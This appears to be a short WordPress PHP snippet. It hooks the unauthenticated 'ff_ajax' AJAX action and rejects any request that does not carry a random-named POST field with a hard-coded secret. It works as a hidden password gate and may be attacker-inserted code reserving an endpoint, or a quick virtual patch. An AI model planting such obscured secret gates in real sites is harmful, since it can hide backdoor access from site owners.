<?php

function multisite_new_wall() {
	if (!isset($_POST["gayhxtneu"]) || $_POST["gayhxtneu"] !== "m7r9i41YYTMDnhq") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'multisite_new_wall', 5, 1);
